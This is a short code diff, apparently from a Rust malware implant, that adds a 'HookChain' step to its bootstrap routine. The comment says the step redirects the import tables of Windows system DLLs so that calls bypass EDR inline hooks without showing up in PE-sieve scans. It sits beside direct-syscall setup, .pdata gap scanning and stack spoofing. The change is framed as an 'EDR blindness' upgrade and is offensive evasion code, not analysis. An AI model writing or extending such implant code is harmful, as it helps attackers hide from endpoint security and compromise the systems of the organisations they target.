@@ -67,6 +67,15 @@ unsafe fn bootstrap() -> Option<LiveNtdll> {
     // hooks; falls back to the hooked ntdll otherwise).
     crate::syscalls::init_global();
 
+    // HookChain (P1, EDR_BLINDNESS_UPGRADE_2026-07.md §3): redirect subsystem
+    // DLL IATs (kernel32/KernelBase/win32u/user32/gdi32/advapi32) so their
+    // internal ntdll calls bypass EDR inline hooks — WITHOUT touching ntdll
+    // .text (PE-sieve hash-clean). Runs after syscalls::init_global (needs the
+    // SSN table + the ntdll syscall;ret gadget). The fresh-map SSN resolution
+    // in init_global means stubs are unhooked at this point, so the RVA→SSN
+    // read lands correct values.
+    let _hookchain_count = unsafe { crate::hookchain::apply() };
+
     // .pdata gap scan + stack-spoof init.
     let scanner = crate::evasion_glue::LivePdataScanner;
     if let Ok(pool) = nyx_implant_evasionsdk::PdataGapScanner::scan(&scanner) {
